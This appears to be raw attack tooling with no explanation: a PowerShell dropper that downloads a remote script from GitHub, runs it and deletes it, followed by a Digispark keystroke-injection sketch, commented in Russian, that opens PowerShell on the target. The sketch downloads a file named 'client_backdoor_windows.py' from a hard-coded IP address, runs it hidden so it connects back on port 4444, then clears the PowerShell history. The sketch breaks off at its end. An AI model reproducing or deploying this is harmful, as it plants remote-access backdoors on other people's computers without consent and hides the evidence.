$url = "raw.githubusercontent.com/robotinsideus12/Sec/refs/heads/main/noadm"


$randomFileName = (Get-Random).ToString() + ".ps1"
$filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName

Write-Host "file created $filePath"

try {
    # SAVE
    Invoke-RestMethod -Uri $url | Set-Content -Path $filePath

    # 3. START
    & $filePath
    
    Write-Host "scrypt started"
}
catch {
    # ERR
    Write-Error "error: $($_.Exception.Message)"
}
finally {
    # 4. DEL
    if (Test-Path $filePath) {
        Remove-Item $filePath
        Write-Host "tmp '$filePath' del."
    }
}





D
void setup() {
  DigiKeyboard.delay(3000);
  
  fullAutoInstall();
}

void loop() {}

void openPowerShell() {
  // Win+R для открытия Run диалога
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  // Вводим powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  
  // Enter для запуска
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
}

void fullAutoInstall() {
  openPowerShell();
  
  // Создаем папку и переходим в неё
  DigiKeyboard.print("mkdir C:\\Windows\\Temp\\wace_temp -Force; cd C:\\Windows\\Temp\\wace_temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Скачиваем клиент
  DigiKeyboard.print("Invoke-WebRequest -Uri 'http://104.164.54.180/boost/client_backdoor_windows.py' -OutFile 'client.py'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
  // Проверяем что файл скачался
  DigiKeyboard.print("ls client.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Запускаем клиент в фоне через PowerShell
  DigiKeyboard.print("Start-Process python -ArgumentList 'client.py 104.164.54.180 4444' -WindowStyle Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  // Очищаем историю PowerShell
  DigiKeyboard.print("Clear-History; exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
